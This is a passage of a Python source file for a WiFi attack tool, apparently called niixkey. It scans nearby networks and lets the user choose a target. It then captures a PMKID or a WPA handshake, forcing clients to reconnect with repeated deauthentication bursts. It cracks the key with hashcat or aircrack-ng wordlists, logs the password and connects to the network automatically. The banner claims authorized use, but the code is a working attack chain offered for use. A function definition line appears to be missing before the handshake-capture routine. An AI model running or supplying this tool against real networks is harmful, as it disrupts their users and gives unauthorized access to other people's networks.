    try:
        cmd    = ['sudo', 'iw', 'dev', interface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=IW_TIMEOUT + 5)
        pb.stop()

        if result.returncode != 0:
            err(f"iw scan failed: {result.stderr.strip()[:200]}")
            return []

        lines           = result.stdout.split('\n')
        current_bssid   = None
        current_ssid    = None
        current_signal  = -100
        current_channel = None
        current_rsn     = ''
        current_wpa     = ''
        current_privacy = ''

        def flush_ap():
            if current_bssid and current_ssid:
                sec = detect_security_from_iw(current_rsn, current_wpa, current_privacy)
                networks.append(Network(
                    ssid=current_ssid, bssid=current_bssid,
                    channel=current_channel, signal=current_signal,
                    security=sec
                ))

        for line in lines:
            ls = line.strip()

            bss_match = re.match(r'BSS\s+([0-9a-fA-F:]{17})', ls)
            if bss_match:
                flush_ap()
                current_bssid   = bss_match.group(1)
                current_ssid    = '<Unknown>'
                current_signal  = -100
                current_channel = None
                current_rsn     = ''
                current_wpa     = ''
                current_privacy = ''
            elif 'signal:' in ls.lower():
                m = re.search(r'signal:\s*([-\d.]+)', ls, re.IGNORECASE)
                if m:
                    try: current_signal = int(float(m.group(1)))
                    except Exception: pass
            elif 'DS Parameter set: channel' in ls:
                m = re.search(r'channel\s+(\d+)', ls)
                if m:
                    try: current_channel = int(m.group(1))
                    except Exception: pass
            elif re.match(r'SSID:', ls):
                try: current_ssid = ls.split(':', 1)[1].strip() or '<Hidden>'
                except Exception: pass
            # RSN IE block (WPA2/WPA3)
            elif 'RSN' in ls or 'rsn' in ls.lower():
                current_rsn += ls.lower() + ' '
            # WPA vendor IE
            elif 'WPA' in ls and 'WPA2' not in ls and 'Version' not in ls:
                current_wpa += ls.lower() + ' '
            elif 'Authentication suites' in ls:
                current_rsn += ls.lower() + ' '
                current_wpa += ls.lower() + ' '
            elif 'capability' in ls.lower() and 'Privacy' in ls:
                current_privacy += 'on'

        flush_ap()  # commit last AP

    except subprocess.TimeoutExpired:
        try: pb.stop()
        except Exception: pass
        err("iw scan timed out")
    except Exception as e:
        try: pb.stop()
        except Exception: pass
        err(f"Alternative scan failed: {e}")

    return sorted(networks, key=lambda x: x.signal, reverse=True)


def display_networks_menu(networks):
    """Display a styled networks table with security type and return the chosen index."""
    if not networks:
        err("No networks found")
        return -1

    display_limit = min(20, len(networks))
    nets = networks[:display_limit]

    section(f"Available Networks  ·  {len(networks)} found")

    hdr = (f"  {c('#', C.BWHITE, C.BOLD):>3}  "
           f"{c('SSID', C.BWHITE, C.BOLD):<28}  "
           f"{c('Security', C.BWHITE, C.BOLD):<10}  "
           f"{c('BSSID', C.BWHITE, C.BOLD):17}  "
           f"{c('Ch', C.BWHITE, C.BOLD):>3}  "
           f"{c('Signal', C.BWHITE, C.BOLD):>7}  "
           f"{c('Quality', C.BWHITE, C.BOLD)}")
    print(hdr)
    divider()

    for i, net in enumerate(nets, 1):
        raw_ssid = net.ssid or '<Hidden>'
        ssid     = (raw_ssid[:25] + c('…', C.DIM)) if len(raw_ssid) > 25 else raw_ssid
        ch       = str(net.channel) if net.channel else c('?', C.DIM)
        bssid    = net.bssid or c('??:??:??:??:??:??', C.DIM)
        sig      = net.signal
        sec      = getattr(net, 'security', 'UNKNOWN')

        # Security badge colours
        if sec == 'WPA3':
            sec_col = C.BGREEN
            sec_str = c(f'WPA3      ', C.BGREEN, C.BOLD)
        elif sec == 'WPA3/WPA2':
            sec_col = C.BCYAN
            sec_str = c(f'WPA3/WPA2 ', C.BCYAN, C.BOLD)
        elif sec == 'WPA2':
            sec_col = C.BYELLOW
            sec_str = c(f'WPA2      ', C.BYELLOW, C.BOLD)
        elif sec == 'WPA':
            sec_col = C.YELLOW
            sec_str = c(f'WPA       ', C.YELLOW, C.BOLD)
        elif sec == 'WEP':
            sec_col = C.BRED
            sec_str = c(f'WEP       ', C.BRED, C.BOLD)
        elif sec == 'OPEN':
            sec_col = C.BMAGENTA
            sec_str = c(f'OPEN      ', C.BMAGENTA, C.BOLD)
        else:
            sec_col = C.DIM
            sec_str = c(f'UNKNOWN   ', C.DIM)

        if sig >= -55:
            sig_col = C.BGREEN;  bars = '▂▄▆█'
        elif sig >= -70:
            sig_col = C.BYELLOW; bars = '▂▄▆░'
        elif sig >= -80:
            sig_col = C.YELLOW;  bars = '▂▄░░'
        else:
            sig_col = C.BRED;    bars = '▂░░░'

        num_s  = c(f'{i:>3}', C.BYELLOW, C.BOLD)
        ssid_s = c(f'{ssid:<28}', C.BWHITE)
        bss_s  = c(f'{bssid:17}', C.DIM)
        ch_s   = c(f'{ch:>3}', C.BCYAN)
        sig_s  = c(f'{sig:>4} dBm', sig_col)
        bar_s  = c(f'  {bars}', sig_col, C.BOLD)

        print(f"  {num_s}  {ssid_s}  {sec_str}  {bss_s}  {ch_s}  {sig_s}{bar_s}")

    divider()
    print()

    while True:
        try:
            raw = ask(f"Select target (1–{display_limit}) or q to quit:")
            if raw.strip().lower() == 'q':
                return -1
            choice = int(raw.strip())
            if 1 <= choice <= display_limit:
                return choice - 1
            warn(f"Please enter a number between 1 and {display_limit}")
        except ValueError:
            warn("Invalid input — enter a number")


def restart_network_manager():
    """Restart network manager service."""
    services = ['NetworkManager', 'networkmanager', 'network-manager',
                'wpa_supplicant', 'networking']
    for svc in services:
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', svc],
                           capture_output=True, timeout=8)
        except Exception:
            pass


def capture_pmkid(interface, bssid, channel, ssid, timeout=90):
    """
    Use hcxdumptool to capture PMKID from the target AP.
    PMKID is derived from the AP alone — no client needed.
    Works on WPA2 and WPA3-transition networks.
    Returns path to hc22000 hash file, or None on failure.
    """
    global MONITOR_IFACE

    if not check_tool('hcxdumptool'):
        warn("hcxdumptool not available — skipping PMKID capture")
        return None

    info(f"PMKID capture on  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}")

    safe_ssid   = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    pcapng_file = f'/tmp/pmkid_{safe_ssid}.pcapng'
    hash_file   = f'pmkid_{safe_ssid}.hc22000'
    filter_file = f'/tmp/pmkid_filter_{safe_ssid}.txt'

    # Write BSSID filter (hcxdumptool filterlist format: mac without colons)
    bssid_clean = bssid.replace(':', '').lower()
    try:
        with open(filter_file, 'w') as f:
            f.write(bssid_clean + '\n')
    except Exception:
        filter_file = None

    # Stop NetworkManager etc so they don't interfere
    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    cmd = ['sudo', 'hcxdumptool', '-i', interface, '-o', pcapng_file,
           '--active_beacon', '--enable_status=3']
    if filter_file:
        cmd += ['--filterlist_ap=' + filter_file, '--filtermode=2']

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pb   = ProgressBar(timeout, label='PMKID hunting  ')
        pb.start()

        # Poll for early PMKID capture every 5 s
        start = time.time()
        found_pmkid = False
        while time.time() - start < timeout:
            time.sleep(5)
            if os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 50:
                # Quick check via hcxpcapngtool / hcxpcaptool
                converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else 'hcxpcaptool'
                if check_tool(converter):
                    r = subprocess.run(
                        [converter, '-o', hash_file, pcapng_file],
                        capture_output=True, text=True, timeout=15
                    )
                    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                        found_pmkid = True
                        break

        pb.stop()
        proc.terminate()
        proc.wait(timeout=5)

    except KeyboardInterrupt:
        try: pb.stop()
        except Exception: pass
        print()
        warn("PMKID capture interrupted")
        try: proc.terminate()
        except Exception: pass
        found_pmkid = False
    except Exception as e:
        try: pb.stop()
        except Exception: pass
        warn(f"PMKID capture error: {e}")
        found_pmkid = False
    finally:
        restart_network_manager()

    # Final conversion attempt if not done yet
    if not found_pmkid and os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 50:
        converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else 'hcxpcaptool'
        if check_tool(converter):
            r = subprocess.run([converter, '-o', hash_file, pcapng_file],
                               capture_output=True, timeout=15)
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                found_pmkid = True

    if found_pmkid:
        ok(f"PMKID captured!  {c(hash_file, C.BWHITE)}")
        return hash_file
    else:
        warn("No PMKID captured from this AP")
        return None


def crack_pmkid_hash(hash_file, bssid):
    """
    Crack a hc22000 PMKID/EAPOL hash file with hashcat (mode 22000).
    Falls back to aircrack-ng if hashcat is unavailable.
    Returns the plaintext password or None.
    """
    info(f"Cracking PMKID hash  {c(hash_file, C.BWHITE)}")

    wordlist_candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        '/usr/share/john/password.lst',
        '/usr/share/dict/words',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt',
    ]
    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)

    if not wordlist:
        warn("No wordlist found — generating minimal test list…")
        wordlist = '/tmp/niixkey_test_passwords.txt'
        common = [
            'password', '12345678', 'admin', 'qwerty', '123456789',
            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
        ]
        with open(wordlist, 'w') as f:
            f.write('\n'.join(common))

    info(f"Wordlist:  {c(wordlist, C.BWHITE)}")

    # ── hashcat mode 22000 (hc22000 = WPA2/WPA3 PMKID + EAPOL) ──
    if check_tool('hashcat'):
        info("Running hashcat mode 22000 (GPU-accelerated)…")
        pot_file = '/tmp/niixkey_hashcat.pot'
        try:
            cmd = [
                'hashcat', '-m', '22000',
                hash_file, wordlist,
                '--potfile-path', pot_file,
                '--status', '--status-timer=10',
                '--quiet',
                '-O',    # optimised kernels
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, bufsize=1)
            password = None
            while True:
                line = proc.stdout.readline()
                if line == '' and proc.poll() is not None:
                    break
                if line.strip():
                    if 'Cracked' in line or ':' in line:
                        print(f"  {c(line.rstrip(), C.DIM)}", end='\r')
            proc.wait()

            # Read pot file for result
            if os.path.exists(pot_file):
                with open(pot_file) as pf:
                    for line in pf:
                        line = line.strip()
                        if ':' in line:
                            password = line.rsplit(':', 1)[-1]
                            break

            if password:
                print()
                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
                return password
            else:
                warn("hashcat: password not found in wordlist")
        except Exception as e:
            warn(f"hashcat error: {e}")

    # ── aircrack-ng fallback (works on EAPOL hashes too) ──
    warn("Falling back to aircrack-ng for PMKID cracking…")
    return None   # aircrack-ng does not support raw hc22000; caller will try handshake path


def crack_wpa_password(capture_file, bssid):
    """Crack WPA/WPA2 4-way handshake using hashcat (hc22000) then aircrack-ng fallback."""
    info(f"Starting dictionary attack on  {c(bssid, C.BCYAN)}")

    cap_files = [
        f for f in os.listdir('.')
        if f.startswith(capture_file) and f.endswith('.cap')
    ]

    if not cap_files:
        err("No capture files found")
        return None

    cap_file = sorted(cap_files)[0]
    info(f"Capture file:  {c(cap_file, C.BWHITE)}")

    wordlist_candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        '/usr/share/john/password.lst',
        '/usr/share/dict/words',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt',
    ]
    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)

    if not wordlist:
        warn("No wordlist found — generating a small test wordlist…")
        wordlist = '/tmp/niixkey_test_passwords.txt'
        common = [
            'password', '12345678', 'admin', 'qwerty', '123456789',
            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
        ]
        with open(wordlist, 'w') as f:
            f.write('\n'.join(common))
        info(f"Test wordlist written: {c(wordlist, C.DIM)}")

    info(f"Wordlist:  {c(wordlist, C.BWHITE)}")
    print()

    # ── Try hashcat first (faster, GPU) via hc22000 conversion ──
    password = None
    if check_tool('hashcat'):
        converter = 'hcxpcapngtool' if check_tool('hcxpcapngtool') else (
                    'hcxpcaptool'   if check_tool('hcxpcaptool')   else None)
        if converter:
            hash_file = f'/tmp/niixkey_handshake_{int(time.time())}.hc22000'
            r = subprocess.run([converter, '-o', hash_file, cap_file],
                               capture_output=True, timeout=30)
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                info("Converted capture to hc22000 — running hashcat mode 22000…")
                divider()
                pot_file = '/tmp/niixkey_hashcat_hs.pot'
                cmd = [
                    'hashcat', '-m', '22000', hash_file, wordlist,
                    '--potfile-path', pot_file,
                    '--status', '--status-timer=15',
                    '--quiet', '-O',
                ]
                try:
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                            text=True, bufsize=1)
                    while True:
                        line = proc.stdout.readline()
                        if line == '' and proc.poll() is not None:
                            break
                        if line.strip():
                            print(f"  {c(line.rstrip(), C.DIM)}", end='\r')
                    proc.wait()
                    divider()
                    if os.path.exists(pot_file):
                        with open(pot_file) as pf:
                            for line in pf:
                                if ':' in line.strip():
                                    password = line.strip().rsplit(':', 1)[-1]
                                    break
                except Exception as e:
                    warn(f"hashcat error: {e}")

    # ── aircrack-ng fallback ──────────────────────────────────────
    if not password:
        info(c("Running aircrack-ng dictionary attack…", C.DIM))
        divider()
        try:
            cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, bufsize=1, universal_newlines=True
            )
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    line = output.strip()
                    if line:
                        if 'KEY FOUND!' in line:
                            print(f"  {c(line, C.BGREEN, C.BOLD)}")
                        elif 'Current passphrase' in line or 'Tested' in line:
                            print(f"  {c(line, C.DIM)}", end='\r')
                        else:
                            print(f"  {c(line, C.DIM)}")
                    if 'KEY FOUND!' in output:
                        m = re.search(r'\[\s*(.+?)\s*\]', output)
                        if m:
                            password = m.group(1).strip()
                        break
            process.wait()
        except Exception as e:
            err(f"aircrack-ng error: {e}")

    divider()

    if password:
        print()
        print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
        print(f"  {'PASSWORD CRACKED':^60}")
        print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
        print()
        print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
        print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
        print()
        return password
    else:
        err("Password not found in wordlist")
        return None



    """
    Capture WPA handshake using airodump-ng.
    Runs indefinitely — sends periodic deauth bursts — until a handshake
    is confirmed by aircrack-ng.  Press Ctrl+C to abort.
    """
    global MONITOR_IFACE

    info(f"Target  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}  ·  Ch {c(str(channel), C.BCYAN)}")

    safe_ssid    = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    capture_file = f"handshake_{safe_ssid}"

    airodump_proc      = None
    monitor_iface      = None
    handshake_captured = False

    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)

        info(f"Enabling monitor mode on {c(interface, C.BWHITE)}…")
        subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                       capture_output=True, timeout=15)

        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")

        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', capture_file,
            '--output-format', 'pcap',
            monitor_iface
        ]
        airodump_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print()
        info(f"Capture file:  {c(capture_file + '-01.cap', C.BYELLOW)}")
        info("Running until a handshake is captured — press  Ctrl+C  to abort")
        info("Deauth packets will be sent every 60 s to force reconnects")
        print()

        start_time      = time.time()
        last_deauth     = start_time
        deauth_interval = 60   # send deauth every 60 s
        check_interval  = 5    # check for handshake every 5 s
        elapsed_display = 0

        while not handshake_captured:
            if airodump_proc.poll() is not None:
                err("airodump-ng stopped unexpectedly")
                break

            now = time.time()

            # ── periodic deauth burst ───────────────────────────────
            if now - last_deauth >= deauth_interval:
                try:
                    subprocess.run(
                        ['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, monitor_iface],
                        capture_output=True, timeout=20
                    )
                    last_deauth = now
                    info(f"Deauth burst sent  ·  elapsed {int(now - start_time)}s")
                except Exception:
                    pass

            # ── check for handshake ─────────────────────────────────
            for suffix in ['-01.cap', '-02.cap', '-03.cap', '-04.cap', '.cap']:
                cap_file = f"{capture_file}{suffix}"
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
                    try:
                        chk = subprocess.run(['aircrack-ng', cap_file],
                                             capture_output=True, text=True, timeout=15)
                        if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
                            handshake_captured = True
                            elapsed            = int(time.time() - start_time)
                            ok(f"Handshake captured!  {c(cap_file, C.BWHITE)}  "
                               f"(elapsed {elapsed}s)")
                            break
                    except Exception:
                        pass

            if not handshake_captured:
                elapsed_display = int(time.time() - start_time)
                mins, secs = divmod(elapsed_display, 60)
                print(f"\r  {c('◆', C.BCYAN, C.BOLD)}  Waiting for handshake…  "
                      f"{c(f'{mins:02d}:{secs:02d}', C.BYELLOW)}  "
                      f"(next deauth in {max(0, deauth_interval - int(time.time()-last_deauth))}s)   ",
                      end='', flush=True)
                time.sleep(check_interval)

        print()   # newline after \r status line

    except KeyboardInterrupt:
        print()
        warn("Capture interrupted by user")

    finally:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            time.sleep(1)
        if monitor_iface:
            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        restart_network_manager()

    if handshake_captured:
        return capture_file
    else:
        err("No handshake captured")
        return None


def auto_connect(ssid, password, interface):
    """
    Automatically connect to the target WiFi network using the cracked password.
    Tries nmcli first (NetworkManager), then wpa_supplicant as a fallback.
    Returns True on success.
    """
    section("Auto-Connect")
    info(f"Connecting to  {c(ssid, C.BWHITE, C.BOLD)}  with cracked credentials…")

    # ── Method 1: nmcli (NetworkManager) ────────────────────
    if shutil.which('nmcli'):
        info("Trying nmcli (NetworkManager)…")
        try:
            # Delete any existing profile with this SSID to avoid conflicts
            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', ssid],
                           capture_output=True, timeout=8)
        except Exception:
            pass

        try:
            result = subprocess.run(
                ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
                 'password', password, 'ifname', interface],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and 'successfully' in result.stdout.lower():
                ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via NetworkManager!")
                return True
            else:
                warn(f"nmcli returned: {result.stdout.strip()[:120] or result.stderr.strip()[:120]}")
        except Exception as e:
            warn(f"nmcli error: {e}")

    # ── Method 2: wpa_supplicant + dhclient ─────────────────
    if shutil.which('wpa_supplicant') and shutil.which('wpa_passphrase'):
        info("Trying wpa_supplicant fallback…")
        conf_path = '/tmp/niixkey_wpa.conf'
        try:
            result = subprocess.run(
                ['wpa_passphrase', ssid, password],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                with open(conf_path, 'w') as f:
                    f.write(result.stdout)

                # Bring interface up
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'],
                               capture_output=True, timeout=5)

                # Run wpa_supplicant in background
                wpa_proc = subprocess.Popen(
                    ['sudo', 'wpa_supplicant', '-B', '-i', interface, '-c', conf_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(5)

                # Get IP via dhclient or dhcpcd
                for dhcp in ['dhclient', 'dhcpcd']:
                    if shutil.which(dhcp):
                        r = subprocess.run(['sudo', dhcp, interface],
                                           capture_output=True, timeout=20)
                        if r.returncode == 0:
                            ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via wpa_supplicant!")
                            ok(f"DHCP lease obtained on  {c(interface, C.BWHITE)}")
                            return True
        except Exception as e:
            warn(f"wpa_supplicant fallback error: {e}")

    # ── Method 3: iw + ip (open networks only — won't work for WPA) ──
    err("Auto-connect failed — connect manually:")
    print(f"  {c('nmcli dev wifi connect', C.DIM)} {c(repr(ssid), C.BWHITE)} "
          f"{c('password', C.DIM)} {c(repr(password), C.BGREEN)}")
    return False


def cleanup():
    """Cleanup resources and restore network."""
    global MONITOR_IFACE
    print()
    info("Cleaning up…")

    if MONITOR_IFACE:
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        except Exception:
            pass

    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line and iface:
                    subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
                                   capture_output=True, timeout=5)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    restart_network_manager()
    ok("Cleanup complete — network restored")


def show_banner():
    """Show colourful tool banner."""
    # Gradient: cyan → blue → magenta across rows
    colours = [C.BCYAN, C.BCYAN, C.BBLUE, C.BBLUE, C.BMAGENTA, C.BMAGENTA]
    rows = [
        r"    ███╗   ██╗██╗██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗",
        r"    ████╗  ██║██║██║╚██╗██╔╝    ██║    ██║██║██╔════╝██║",
        r"    ██╔██╗ ██║██║██║ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║",
        r"    ██║╚██╗██║██║██║ ██╔██╗     ██║███╗██║██║██╔══╝  ██║",
        r"    ██║ ╚████║██║██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║",
        r"    ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝",
    ]
    print()
    for row, col in zip(rows, colours):
        print(c(row, col, C.BOLD))
    print()
    sub  = c("  Universal WiFi Security Testing Tool", C.BWHITE, C.BOLD)
    ver  = c("v2.0", C.BYELLOW, C.BOLD)
    print(f"{sub}  {ver}")
    print(c("  Arch Linux  │  Debian / Ubuntu / Kali  │  Fedora / RHEL", C.DIM))
    print(c("  For Authorized Testing and Educational Use Only", C.BRED, C.DIM))
    print()


def main():
    """Main entry point."""
    os.system('clear')
    show_banner()

    # Require root
    if os.geteuid() != 0:
        err("This tool requires root privileges!")
        info("Run:  sudo python3 niixkey.py")
        sys.exit(1)

    # Check OS
    os_name = get_os()
    info(f"Operating System:  {c(os_name, C.BWHITE, C.BOLD)}")

    if "Unknown" in os_name:
        err("This tool only supports Linux")
        sys.exit(1)

    # ── Dependencies ──────────────────────────────────────
    section("System Check")
    info("Checking dependencies…")
    if not check_all_dependencies():
        warn("Some dependencies are missing — installing now…")
        if not install_dependencies():
            warn("Some dependencies could not be installed")
            resp = ask("Continue anyway? [y/N]")
            if resp.strip().lower() != 'y':
                cleanup()
                sys.exit(1)
    ok("All dependencies satisfied")

    # ── Wireless interfaces ───────────────────────────────
    section("Interface Selection")
    info("Detecting wireless interfaces…")
    interfaces = get_wireless_interfaces()

    if not interfaces:
        err("No wireless interfaces found!")
        warn("Make sure a monitor-capable adapter is connected")
        info(c("Compatible chipsets: AR9271 · RT3070 · RT3572 · MT7601U", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Found:  {c(', '.join(interfaces), C.BWHITE, C.BOLD)}")

    if len(interfaces) > 1:
        print()
        for i, iface in enumerate(interfaces, 1):
            print(f"    {c(str(i), C.BYELLOW, C.BOLD)}.  {c(iface, C.BWHITE)}")
        print()
        while True:
            try:
                raw = ask(f"Select interface (1–{len(interfaces)}):")
                choice = int(raw.strip())
                if 1 <= choice <= len(interfaces):
                    interface = interfaces[choice - 1]
                    break
                warn(f"Enter a number between 1 and {len(interfaces)}")
            except ValueError:
                warn("Invalid input")
    else:
        interface = interfaces[0]
        info(f"Using interface:  {c(interface, C.BWHITE, C.BOLD)}")

    # ── Network scan ──────────────────────────────────────
    section("Network Scan")
    networks = scan_networks(interface)

    if not networks:
        err("No networks found during scan")
        warn("Check that your adapter supports monitor mode")
        info(c("Try:  iw list | grep -A 10 'Supported interface modes'", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Discovered  {c(str(len(networks)), C.BYELLOW, C.BOLD)}  network(s)")

    # ── Target selection ──────────────────────────────────
    network_idx = display_networks_menu(networks)
    if network_idx == -1:
        info("Cancelled by user")
        cleanup()
        sys.exit(0)

    selected = networks[network_idx]

    # ── Confirmation card ─────────────────────────────────
    section("Selected Target")
    divider()
    print(f"  {c('SSID    ', C.DIM)}  {c(selected.ssid, C.BWHITE, C.BOLD)}")
    print(f"  {c('BSSID   ', C.DIM)}  {c(selected.bssid, C.BCYAN)}")
    print(f"  {c('Channel ', C.DIM)}  {c(str(selected.channel), C.BYELLOW)}")
    print(f"  {c('Signal  ', C.DIM)}  {c(str(selected.signal) + ' dBm', C.BGREEN if selected.signal > -70 else C.BYELLOW)}")
    sec_display = getattr(selected, 'security', 'UNKNOWN')
    if sec_display == 'WPA3':
        sec_col = C.BGREEN
    elif sec_display in ('WPA3/WPA2', 'WPA2'):
        sec_col = C.BYELLOW
    elif sec_display == 'OPEN':
        sec_col = C.BMAGENTA
    else:
        sec_col = C.BRED
    print(f"  {c('Security', C.DIM)}  {c(sec_display, sec_col, C.BOLD)}")
    divider()
    print()

    resp = ask("Proceed with this target? [y/N]")
    if resp.strip().lower() != 'y':
        info("Cancelled")
        cleanup()
        sys.exit(0)

    if not selected.channel:
        selected = selected._replace(channel=1)
        warn("Channel unknown — defaulting to ch 1")

    # ── Attack routing based on security type ─────────────
    sec = getattr(selected, 'security', 'UNKNOWN')

    if sec == 'OPEN':
        warn("Network is OPEN — no password required")
        auto_connect(selected.ssid, '', interface)
        cleanup()
        section("Session Complete")
        ok(f"Done  ·  {c(time.strftime('%H:%M:%S'), C.DIM)}")
        print()
        sys.exit(0)

    if sec == 'WEP':
        section("WEP Attack")
        warn("WEP detected — use aircrack-ng directly (WEP cracking not in scope here)")
        cleanup()
        sys.exit(0)

    # WPA2, WPA3, WPA3/WPA2, WPA, UNKNOWN — all go through PMKID + handshake path
    password = None

    # ── Phase 1: PMKID attack (works on WPA2 & WPA3-transition) ──
    section("Phase 1 — PMKID Attack")
    info("PMKID attack does not require a connected client — faster than handshake capture")
    pmkid_hash_file = capture_pmkid(interface, selected.bssid, selected.channel, selected.ssid)

    if pmkid_hash_file:
        section("Cracking PMKID Hash")
        password = crack_pmkid_hash(pmkid_hash_file, selected.bssid)

    # ── Phase 2: Handshake capture if PMKID failed ────────
    if not password:
        if pmkid_hash_file:
            warn("PMKID crack failed — falling back to 4-way handshake capture")
        else:
            info("PMKID capture unsuccessful — proceeding to handshake capture")

        section("Phase 2 — 4-Way Handshake Capture")
        capture_file = capture_handshake(
            interface, selected.bssid, selected.channel, selected.ssid
        )

        if not capture_file:
            err("Handshake capture failed or was cancelled")
            cleanup()
            sys.exit(1)

        section("Cracking Handshake")
        password = crack_wpa_password(capture_file, selected.bssid)

    # ── Save & finish ─────────────────────────────────────
    if password:
        results_file = 'cracked_results.txt'
        timestamp    = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(results_file, 'a') as f:
            f.write(f"{'─' * 60}\n")
            f.write(f"Date:     {timestamp}\n")
            f.write(f"SSID:     {selected.ssid}\n")
            f.write(f"BSSID:    {selected.bssid}\n")
            f.write(f"Security: {sec}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'─' * 60}\n\n")
        ok(f"Results saved →  {c(results_file, C.BWHITE)}")

        # ── Auto-connect ──────────────────────────────────
        auto_connect(selected.ssid, password, interface)
    else:
        section("No Password Found")
        warn("The password was not in the wordlist")
        info("Suggestions:")
        print(f"    {c('1.', C.BYELLOW)} Use rockyou.txt or a larger wordlist")
        print(f"    {c('2.', C.BYELLOW)} Try hashcat with rule-based mutation")
        print(f"    {c('3.', C.BYELLOW)} The network may use a strong random key")

    cleanup()
    section("Session Complete")
    ok(f"Done  ·  {c(time.strftime('%H:%M:%S'), C.DIM)}")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user")
        cleanup()
        sys.exit(0)
    except Exception as e:
        err(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        cleanup()
        sys.exit(1)
